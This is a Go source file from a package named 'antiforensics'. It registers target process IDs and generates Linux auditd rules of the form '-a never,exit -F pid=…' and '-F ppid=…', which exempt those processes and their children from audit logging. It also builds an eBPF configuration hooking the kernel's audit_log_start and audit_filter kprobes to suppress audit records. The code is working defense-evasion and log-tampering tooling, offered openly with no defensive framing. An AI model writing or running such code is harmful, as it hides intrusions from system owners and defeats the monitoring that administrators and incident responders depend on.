package antiforensics

import (
	"fmt"
)

type AuditConfig struct {
	TargetPIDs   []uint32
	SuppressExec bool
	SuppressOpen bool
	SuppressNet  bool
}

func (c *Controller) ConfigureAuditSuppression(cfg AuditConfig) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	for _, pid := range cfg.TargetPIDs {
		c.filterPIDs[pid] = true
	}

	return nil
}

func (c *Controller) GenerateAuditRules() []string {
	c.mu.Lock()
	defer c.mu.Unlock()

	var rules []string
	for pid := range c.filterPIDs {
		rules = append(rules, fmt.Sprintf("-a never,exit -F pid=%d", pid))
		rules = append(rules, fmt.Sprintf("-a never,exit -F ppid=%d", pid))
	}
	return rules
}

type AuditHookConfig struct {
	HookAuditLogStart bool
	HookAuditLogEnd   bool
	FilterByComm      []string
}

func (c *Controller) GetAuditHookBPFConfig() map[string]any {
	c.mu.Lock()
	defer c.mu.Unlock()

	pids := make([]uint32, 0, len(c.filterPIDs))
	for pid := range c.filterPIDs {
		pids = append(pids, pid)
	}

	return map[string]any{
		"filter_pids": pids,
		"hook_points": []string{
			"kprobe/audit_log_start",
			"kprobe/audit_filter",
		},
	}
}
